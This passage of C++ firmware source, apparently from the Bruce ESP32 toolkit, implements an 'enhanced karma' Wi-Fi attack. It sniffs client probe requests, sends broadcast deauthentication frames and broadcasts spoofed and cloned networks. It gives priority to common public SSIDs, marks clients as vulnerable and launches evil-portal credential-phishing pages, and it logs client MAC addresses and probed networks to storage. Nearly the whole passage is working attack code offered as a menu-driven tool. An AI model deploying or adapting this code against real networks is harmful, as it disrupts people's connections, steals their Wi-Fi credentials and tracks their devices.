    attackConfig.enableBeaconing = true;
    attackConfig.highTierDuration = 60000;
    attackConfig.mediumTierDuration = 30000;
    attackConfig.fastTierDuration = 15000;
    attackConfig.cloneDuration = 90000;
    attackConfig.maxCloneNetworks = 3;
    
    nvs_flash_init();
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    
    cfg.rx_ba_win = 16;
    cfg.nvs_enable = false;
    
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
    
    Serial.println("Modern karma attack started!");
    Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 currentBSSID[0], currentBSSID[1], currentBSSID[2],
                 currentBSSID[3], currentBSSID[4], currentBSSID[5]);
    
    vTaskDelay(1000 / portTICK_RATE_MS);
    
    for (;;) {
        if (restartKarmaAfterPortal) {
            restartKarmaAfterPortal = false;
            
            esp_wifi_stop();
            delay(100);
            
            esp_wifi_start();
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
            esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
            
            redraw = true;
            redrawNeeded = true;
        }
        
        if (returnToMenu) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            esp_wifi_stop();
            
            if (macRingBuffer) {
                vRingbufferDelete(macRingBuffer);
                macRingBuffer = NULL;
            }
            
            while (!responseQueue.empty()) {
                responseQueue.pop();
            }
            
            display_clear();
            
            Serial.printf("[KARMA] Exit complete. Heap: %lu\n", ESP.getFreeHeap());
            return;
        }
        
        unsigned long currentTime = millis();
        
        rotateBSSID();
        
        if (karmaConfig.enableSmartHop) {
            smartChannelHop();
        }
        
        if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL)) {
            sendDeauth("FF:FF:FF:FF:FF:FF", all_wifi_channels[channl], true);
            lastDeauthTime = currentTime;
        }
        
        if (attackConfig.enableBeaconing) {
            sendBeaconFrames();
        }
        
        processResponseQueue();
        
        checkCloneAttackOpportunities();
        
        checkPendingPortals();
        
        checkForAssociations();
        
        if (broadcastAttack.isActive()) {
            broadcastAttack.update();
        }
        
        if (check(NextPress)) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            channl++;
            if (channl >= sizeof(all_wifi_channels)/sizeof(all_wifi_channels[0])) channl = 0;
            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
            esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_RATE_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
        }
        
        if (PrevPress) {
#if !defined(HAS_KEYBOARD) && !defined(HAS_ENCODER)
            LongPress = true;
            long _tmp = millis();
            while (PrevPress) {
                if (millis() - _tmp > 150)
                    tft.drawArc(
                        tftWidth / 2,
                        tftHeight / 2,
                        25,
                        15,
                        0,
                        360 * (millis() - _tmp) / 700,
                        getColorVariation(bruceConfig.priColor),
                        bruceConfig.bgColor
                    );
                vTaskDelay(10 / portTICK_RATE_MS);
            }
            LongPress = false;
            if (millis() - _tmp > 700) {
                returnToMenu = true;
                continue;
            }
#endif
            check(PrevPress);
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            if (channl > 0) channl--;
            else channl = sizeof(all_wifi_channels)/sizeof(all_wifi_channels[0]) - 1;
            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
            esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_PERIOD_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
        }
        
#if defined(HAS_KEYBOARD) || defined(T_EMBED)
        if (check(EscPress)) {
            returnToMenu = true;
            continue;
        }
#endif
        
        if (check(SelPress) || redraw || redrawNeeded) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            if (!redraw && !redrawNeeded) {
                std::vector<Option> options = {
                    {"Enhanced Stats", [=]() {
                         drawMainBorderWithTitle("ADVANCED STATS");
                         
                         int y = 40;
                         tft.setTextSize(1);
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Total Probes: " + String(totalProbes));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Unique Clients: " + String(uniqueClients));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Karma Responses: " + String(karmaResponsesSent));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Beacons Sent: " + String(beaconsSent));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Active Networks: " + String(activeNetworks.size()));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Response Queue: " + String(responseQueue.size()));
                         
                         tft.setCursor(10, y); y += 15;
                         int wpa2Count = 0;
                         int wpa3Count = 0;
                         for (const auto &net : activeNetworks) {
                             if (net.rsn.akmSuite == 2) wpa3Count++;
                             else if (net.rsn.akmSuite == 1) wpa2Count++;
                         }
                         tft.print("WPA2: " + String(wpa2Count) + " WPA3: " + String(wpa3Count));
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Blacklisted MACs: " + String(macBlacklist.size()));
                         
                         tft.setCursor(10, y); y += 15;
                         String bssidStr = "";
                         for (int i = 0; i < 6; i++) {
                             if (i > 0) bssidStr += ":";
                             bssidStr += String(currentBSSID[i], HEX);
                         }
                         tft.print("BSSID: " + bssidStr);
                         
                         tft.setCursor(10, y); y += 15;
                         tft.print("Top Networks:");
                         y += 5;
                         
                         std::vector<std::pair<String, uint32_t>> topNetworks;
                         for (const auto &history : networkHistory) {
                             topNetworks.push_back(std::make_pair(history.first, history.second.responsesSent));
                         }
                         
                         std::sort(topNetworks.begin(), topNetworks.end(),
                             [](const auto &a, const auto &b) { return a.second > b.second; });
                         
                         for (int i = 0; i < std::min(5, (int)topNetworks.size()); i++) {
                             tft.setCursor(20, y); y += 12;
                             String line = topNetworks[i].first.substring(0, 15) + 
                                          ": " + String(topNetworks[i].second);
                             tft.print(line);
                         }
                         
                         while (!check(SelPress) && !check(EscPress)) {
                             delay(50);
                         }
                         redrawNeeded = true;
                     }},
                    
                    {"Toggle Beaconing", [=]() {
                         attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
                         displayTextLine(attackConfig.enableBeaconing ? 
                                        "Beaconing: ON" : "Beaconing: OFF");
                         delay(1000);
                     }},
                    
                    {"Rotate BSSID Now", [=]() {
                         generateRandomBSSID(currentBSSID);
                         displayTextLine("BSSID rotated");
                         delay(1000);
                     }},
                    
                    {"Clear Blacklist", [=]() {
                         macBlacklist.clear();
                         displayTextLine("MAC blacklist cleared");
                         delay(1000);
                     }},
                    
                    {"Export Network List", [=]() {
                         if (is_LittleFS) saveNetworkHistory(LittleFS);
                         else saveNetworkHistory(SD);
                         displayTextLine("Network list saved!");
                         delay(1000);
                     }},
                    
                    {"Karma Attack",
                     [=]() {
                         std::vector<ClientBehavior> vulnerable = getVulnerableClients();
                         std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();

                         std::vector<Option> karmaOptions;

                         for (const auto &client : vulnerable) {
                             if (!client.probedSSIDs.empty()) {
                                 String itemText = client.mac.substring(9) + " (VULN)";
                                 karmaOptions.push_back({itemText.c_str(), [=]() {
                                     launchManualEvilPortal(client.probedSSIDs[0], 
                                                           client.favoriteChannel, 
                                                           selectedTemplate.verifyPassword);
                                 }});
                             }
                         }

                         for (const auto &probe : uniqueProbes) {
                             String itemText = probe.ssid + " (" + String(probe.rssi) + "|ch " + String(probe.channel) + ")";
                             karmaOptions.push_back({itemText.c_str(), [=]() {
                                 launchManualEvilPortal(probe.ssid, probe.channel, 
                                                       selectedTemplate.verifyPassword);
                             }});
                         }

                         karmaOptions.push_back({"Back", [=]() {}});
                         loopOptions(karmaOptions);
                     }},

                    {"Select Template",
                     [=]() {
                         std::vector<Option> templateOptions;

                         for (const auto &tmpl : portalTemplates) {
                             String displayName = tmpl.name;
                             if (tmpl.isDefault) displayName = "[D] " + displayName;
                             if (tmpl.verifyPassword) displayName += " (verify)";

                             templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
                                 selectedTemplate = tmpl;
                                 templateSelected = true;
                                 karmaConfig.enableAutoPortal = true;
                                 displayTextLine("Template: " + tmpl.name);
                                 delay(1000);
                             }});
                         }

                         templateOptions.push_back({"Load Custom File", [=]() {
                             std::vector<Option> loadOptions;

                             loadOptions.push_back({"Load from SD", [=]() {
                                 if (setupSdCard()) {
                                     String templateFile = loopSD(SD, true, "HTML");
                                     if (templateFile.length() > 0) {
                                         PortalTemplate customTmpl;
                                         customTmpl.name = "[Custom] " + templateFile;
                                         customTmpl.filename = templateFile;
                                         customTmpl.isDefault = false;
                                         customTmpl.verifyPassword = false;

                                         File file = SD.open(templateFile, FILE_READ);
                                         if (file) {
                                             String firstLine = file.readStringUntil('\n');
                                             file.close();
                                             if (firstLine.indexOf("verify=\"true\"") != -1) {
                                                 customTmpl.verifyPassword = true;
                                                 customTmpl.name += " (verify)";
                                             }
                                         }

                                         selectedTemplate = customTmpl;
                                         templateSelected = true;
                                         portalTemplates.push_back(customTmpl);
                                         karmaConfig.enableAutoPortal = true;
                                         displayTextLine("Selected: " + customTmpl.name);
                                         delay(1000);
                                     }
                                 } else {
                                     displayTextLine("SD Card not found!");
                                     delay(1000);
                                 }
                             }});

                             loadOptions.push_back({"Load from LittleFS", [=]() {
                                 if (LittleFS.begin()) {
                                     String templateFile = loopSD(LittleFS, true, "HTML");
                                     if (templateFile.length() > 0) {
                                         PortalTemplate customTmpl;
                                         customTmpl.name = "[Custom] " + templateFile;
                                         customTmpl.filename = templateFile;
                                         customTmpl.isDefault = false;
                                         customTmpl.verifyPassword = false;

                                         File file = LittleFS.open(templateFile, FILE_READ);
                                         if (file) {
                                             String firstLine = file.readStringUntil('\n');
                                             file.close();
                                             if (firstLine.indexOf("verify=\"true\"") != -1) {
                                                 customTmpl.verifyPassword = true;
                                                 customTmpl.name += " (verify)";
                                             }
                                         }

                                         selectedTemplate = customTmpl;
                                         templateSelected = true;
                                         portalTemplates.push_back(customTmpl);
                                         karmaConfig.enableAutoPortal = true;
                                         displayTextLine("Selected: " + customTmpl.name);
                                         delay(1000);
                                     }
                                     LittleFS.end();
                                 } else {
                                     displayTextLine("LittleFS error!");
                                     delay(1000);
                                 }
                             }});

                             loadOptions.push_back({"Back", [=]() {}});

                             loopOptions(loadOptions);
                         }});

                         templateOptions.push_back({"Disable Auto-Portal", [=]() {
                             karmaConfig.enableAutoPortal = false;
                             templateSelected = false;
                             displayTextLine("Auto-portal disabled");
                             delay(1000);
                         }});

                         templateOptions.push_back({"Back", [=]() {}});
                         loopOptions(templateOptions);
                     }},

                    {"Attack Strategy",
                     [=]() {
                         std::vector<Option> strategyOptions = {
                             {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode",
                              [=]() {
                                  attackConfig.defaultTier = TIER_CLONE;
                                  displayTextLine("Clone mode enabled");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_HIGH;
                                  displayTextLine("High tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_MEDIUM;
                                  displayTextLine("Medium tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_FAST;
                                  displayTextLine("Fast tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection",
                              [=]() {
                                  attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
                                  displayTextLine(attackConfig.enableCloneMode ? 
                                                 "Clone detection ON" : "Clone detection OFF");
                                  delay(1000);
                              }},
                             {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack",
                              [=]() {
                                  attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
                                  displayTextLine(attackConfig.enableTieredAttack ? 
                                                 "Tiered attack ON" : "Tiered attack OFF");
                                  delay(1000);
                              }},
                             {attackConfig.enableBeaconing ? "* Beaconing" : "- Beaconing",
                              [=]() {
                                  attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
                                  displayTextLine(attackConfig.enableBeaconing ? 
                                                 "Beaconing ON" : "Beaconing OFF");
                                  delay(1000);
                              }},
                             {"Back", [=]() {}}
                         };
                         loopOptions(strategyOptions);
                     }},

                    {"Active Broadcast Attack", [=]() {
                        std::vector<Option> broadcastOptions;

                        broadcastOptions.push_back({broadcastAttack.isActive() ? 
                            "* Stop Broadcast" : "Start Broadcast", [=]() {
                            if (broadcastAttack.isActive()) {
                                broadcastAttack.stop();
                                displayTextLine("Broadcast stopped");
                            } else {
                                broadcastAttack.start();
                                size_t totalSSIDs = SSIDDatabase::getCount();
                                if (broadcastAttack.isActive()) {
                                    displayTextLine(String(totalSSIDs) + " SSIDs loaded");
                                } else {
                                    displayTextLine("Failed to start broadcast");
                                }
                            }
                            delay(1000);
                        }});

                        broadcastOptions.push_back({"Database Info", [=]() {
                            drawMainBorderWithTitle("SSID DATABASE");
                            
                            int y = 40;
                            tft.setTextSize(1);
                            
                            size_t total = SSIDDatabase::getCount();
                            std::vector<String> popular = SSIDDatabase::getPopularSSIDs(8);
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Total SSIDs: " + String(total));
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Top SSIDs:");
                            y += 5;
                            
                            for (size_t i = 0; i < popular.size(); i++) {
                                tft.setCursor(15, y); y += 12;
                                String line = String(i+1) + ". " + popular[i];
                                if (line.length() > 35) line = line.substring(0, 32) + "...";
                                tft.print(line);
                            }
                            
                            while (!check(SelPress) && !check(EscPress)) {
                                delay(50);
                            }
                        }});

                        broadcastOptions.push_back({"Manage Database", [=]() {
                            std::vector<Option> dbOptions = {
                                {"Add Current Probes", [=]() {
                                    std::vector<ProbeRequest> probes = getUniqueProbes();
                                    int added = 0;
                                    
                                    for (const auto& probe : probes) {
                                        if (!probe.ssid.isEmpty()) {
                                            SSIDDatabase::addSSID(probe.ssid);
                                            added++;
                                            
                                            String ssidLower = probe.ssid;
                                            ssidLower.toLowerCase();
                                            if (ssidLower.indexOf("starbucks") != -1 ||
                                                ssidLower.indexOf("xfinity") != -1 ||
                                                ssidLower.indexOf("attwifi") != -1 ||
                                                ssidLower.indexOf("spectrum") != -1 ||
                                                ssidLower.indexOf("eduroam") != -1) {
                                                SSIDDatabase::setHighPriority(probe.ssid, true);
                                            }
                                        }
                                    }
                                    
                                    displayTextLine("Added " + String(added) + " SSIDs");
                                    delay(1000);
                                }},
                                
                                {"Export to File", [=]() {
                                    if (setupSdCard()) {
                                        String filename = "/ProbeData/ssid_database_" + String(millis()) + ".txt";
                                        File file = SD.open(filename, FILE_WRITE);
                                        if (file) {
                                            std::vector<String> ssids = SSIDDatabase::getSSIDs();
                                            for (const auto& ssid : ssids) {
                                                file.println(ssid);
                                            }
                                            file.close();
                                            displayTextLine("Exported to SD");
                                        } else {
                                            displayTextLine("Export failed!");
                                        }
                                    } else {
                                        displayTextLine("SD not available!");
                                    }
                                    delay(1000);
                                }},
                                
                                {"Clear Database", [=]() {
                                    SSIDDatabase::clear();
                                    displayTextLine("Database cleared");
                                    delay(1000);
                                }},
                                
                                {"Reload from Disk", [=]() {
                                    SSIDDatabase::clear();
                                    if (SSIDDatabase::autoLoad()) {
                                        displayTextLine("Reloaded: " + String(SSIDDatabase::getCount()) + " SSIDs");
                                    } else {
                                        displayTextLine("Reload failed!");
                                    }
                                    delay(1000);
                                }},
                                
                                {"Back", [=]() {}}
                            };
                            loopOptions(dbOptions);
                        }});

                        broadcastOptions.push_back({"Set Speed", [=]() {
                            std::vector<Option> speedOptions = {
                                {"Very Fast (100ms)", [=]() { 
                                    broadcastAttack.setBroadcastInterval(100);
                                    displayTextLine("Speed: Very Fast");
                                    delay(1000);
                                }},
                                {"Fast (200ms)", [=]() { 
                                    broadcastAttack.setBroadcastInterval(200);
                                    displayTextLine("Speed: Fast");
                                    delay(1000);
                                }},
                                {"Normal (300ms)", [=]() { 
                                    broadcastAttack.setBroadcastInterval(300);
                                    displayTextLine("Speed: Normal");
                                    delay(1000);
                                }},
                                {"Slow (500ms)", [=]() { 
                                    broadcastAttack.setBroadcastInterval(500);
                                    displayTextLine("Speed: Slow");
                                    delay(1000);
                                }},
                                {"Very Slow (1000ms)", [=]() { 
                                    broadcastAttack.setBroadcastInterval(1000);
                                    displayTextLine("Speed: Very Slow");
                                    delay(1000);
                                }},
                                {"Back", [=]() {}}
                            };
                            loopOptions(speedOptions);
                        }});

                        broadcastOptions.push_back({"Show Stats", [=]() {
                            drawMainBorderWithTitle("BROADCAST STATS");
                            
                            int y = 40;
                            tft.setTextSize(1);
                            
                            size_t totalSSIDs = SSIDDatabase::getCount();
                            size_t currentPos = broadcastAttack.getCurrentPosition();
                            float progress = broadcastAttack.getProgressPercent();
                            BroadcastStats stats = broadcastAttack.getStats();
                            
                            unsigned long runtime = millis() - stats.startTime;
                            float broadcastsPerSec = stats.totalBroadcasts > 0 ? 
                                (stats.totalBroadcasts * 1000.0) / runtime : 0;
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Total SSIDs: " + String(totalSSIDs));
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Progress: " + String(currentPos) + "/" + String(totalSSIDs));
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Percent: " + String(progress, 1) + "%");
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Broadcasts: " + String(stats.totalBroadcasts));
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Responses: " + String(stats.totalResponses));
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Rate: " + String(broadcastsPerSec, 1) + "/s");
                            
                            tft.setCursor(10, y); y += 15;
                            tft.print("Status: " + String(broadcastAttack.isActive() ? "ACTIVE" : "INACTIVE"));
                            
                            auto topResponses = broadcastAttack.getTopResponses(3);
                            if (!topResponses.empty()) {
                                y += 10;
                                tft.setCursor(10, y); y += 15;
                                tft.print("Top responses:");
                                
                                for (const auto &response : topResponses) {
                                    tft.setCursor(20, y); y += 12;
                                    String line = response.first.substring(0, 15) + ": " + String(response.second);
                                    tft.print(line);
                                }
                            }
                            
                            while (!check(SelPress) && !check(EscPress)) {
                                delay(50);
                            }
                        }});

                        broadcastOptions.push_back({"Back", [=]() {}});
                        
                        loopOptions(broadcastOptions);
                    }},

                    {"Save Probes",
                     [=]() {
                         if (is_LittleFS) saveProbesToFile(LittleFS, true);
                         else saveProbesToFile(SD, true);
                         displayTextLine("Probes saved!");
                     }},

                    {"Clear Probes",
                     [=]() {
                         clearProbes();
                         displayTextLine("Probes cleared!");
                     }},

                    {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma",
                     [=]() {
                         karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
                         displayTextLine(karmaConfig.enableAutoKarma ? "Auto Karma: ON" : "Auto Karma: OFF");
                     }},

                    {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal",
                     [=]() {
                         if (!templateSelected) {
                             displayTextLine("Select template first!");
                             delay(1000);
                             return;
                         }
                         karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
                         displayTextLine(karmaConfig.enableAutoPortal ? "Auto Portal: ON" : "Auto Portal: OFF");
                     }},

                    {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth",
                     [=]() {
                         karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
                         displayTextLine(karmaConfig.enableDeauth ? "Deauth: ON" : "Deauth: OFF");
                     }},

                    {karmaConfig.enableSmartHop ? "* Smart Hop" : "- Smart Hop",
                     [=]() {
                         karmaConfig.enableSmartHop = !karmaConfig.enableSmartHop;
                         displayTextLine(karmaConfig.enableSmartHop ? "Smart Hop: ON" : "Smart Hop: OFF");
                     }},

                    {auto_hopping ? "* Auto Hop" : "- Auto Hop",
                     [=]() {
                         auto_hopping = !auto_hopping;
                         displayTextLine(auto_hopping ? "Auto Hop: ON" : "Auto Hop: OFF");
                     }},

                    {hop_interval == FAST_HOP_INTERVAL ? "* Fast Hop" : "- Fast Hop",
                     [=]() {
                         hop_interval =
                             (hop_interval == FAST_HOP_INTERVAL) ? DEFAULT_HOP_INTERVAL : FAST_HOP_INTERVAL;
                         displayTextLine(
                             hop_interval == FAST_HOP_INTERVAL ? "Fast Hop: ON" : "Fast Hop: OFF"
                         );
                     }},

                    {"Show Stats",
                     [=]() {
                         drawMainBorderWithTitle("KARMA STATS");

                         int y = 40;
                         tft.setTextSize(1);

                         tft.setCursor(10, y); y += 15;
                         tft.print("Total Probes: " + String(totalProbes));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Unique Clients: " + String(uniqueClients));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Karma Responses: " + String(karmaResponsesSent));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Auto Portals: " + String(autoPortalsLaunched));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Clone Attacks: " + String(cloneAttacksLaunched));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Deauth Packets: " + String(deauthPacketsSent));

                         tft.setCursor(10, y); y += 15;
                         int vulnCount = 0;
                         for (const auto &clientPair : clientBehaviors) {
                             if (clientPair.second.isVulnerable) vulnCount++;
                         }
                         tft.print("Vulnerable: " + String(vulnCount));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Pending Attacks: " + String(pendingPortals.size()));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Best Channel: " + String(getBestChannel()));

                         tft.setCursor(10, y); y += 15;
                         if (templateSelected) {
                             tft.print("Template: " + selectedTemplate.name);
                         } else {
                             tft.print("Template: None");
                         }

                         tft.setCursor(10, y); y += 15;
                         String tierName = "";
                         switch(attackConfig.defaultTier) {
                             case TIER_CLONE: tierName = "Clone"; break;
                             case TIER_HIGH: tierName = "High"; break;
                             case TIER_MEDIUM: tierName = "Medium"; break;
                             case TIER_FAST: tierName = "Fast"; break;
                             default: tierName = "None"; break;
                         }
                         tft.print("Attack Tier: " + tierName);

                         while (!check(SelPress) && !check(EscPress)) {
                             delay(50);
                         }
                         redrawNeeded = true;
                     }},

                    {"Exit Karma", [=]() { returnToMenu = true; }},
                };
                loopOptions(options);
            }
            
            if (returnToMenu) {
                continue;
            }
            redraw = false;
            redrawNeeded = false;
            tft.drawPixel(0, 0, 0);
            drawMainBorderWithTitle("ENHANCED KARMA ATK");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("Saved to " + FileSys);
            padprintln("Modern Karma Active");
            if (templateSelected) {
                padprintln("Template: " + selectedTemplate.name);
            } else {
                padprintln("Template: None");
            }
            padprintln(String(BTN_ALIAS) + ": Enhanced Menu");
            tft.drawRightString(
                "Ch." +
                    String(
                        all_wifi_channels[channl] < 10    ? "  "
                        : all_wifi_channels[channl] < 100 ? " "
                                                          : ""
                    ) +
                    String(all_wifi_channels[channl]) + "(Next)",
                tftWidth - 10,
                tftHeight - 18,
                1
            );
        }
        
        updateKarmaDisplay();
        
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void saveProbesToFile(FS &fs, bool compressed) {
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");

    if (compressed) {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.write('K');
            file.write('R');
            file.write('M');
            file.write(0x02);

            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            uint16_t count16 = (uint16_t)count;
            file.write((uint8_t*)&count16, 2);

            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];

                uint32_t timestamp = probe.timestamp;
                file.write((uint8_t*)&timestamp, 4);
                file.write((uint8_t*)probe.mac.c_str(), 17);
                int8_t rssi = (int8_t)probe.rssi;
                file.write((uint8_t*)&rssi, 1);
                file.write((uint8_t*)&probe.channel, 1);

                uint8_t ssidLen = (uint8_t)probe.ssid.length();
                file.write(&ssidLen, 1);
                if (ssidLen > 0) {
                    file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
                }
            }
            file.close();
            Serial.println("[KARMA] Probes saved in compressed format");
        }
    } else {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.println("Timestamp,MAC,RSSI,Channel,SSID");
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;

            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];

                if (probe.ssid.length() > 0) {
                    file.printf(
                        "%lu,%s,%d,%d,\"%s\"\n", 
                        probe.timestamp, 
                        probe.mac.c_str(), 
                        probe.rssi, 
                        probe.channel, 
                        probe.ssid.c_str()
                    );
                }
            }
            file.close();
            Serial.println("[KARMA] Probes saved in CSV format");
        }
    }
}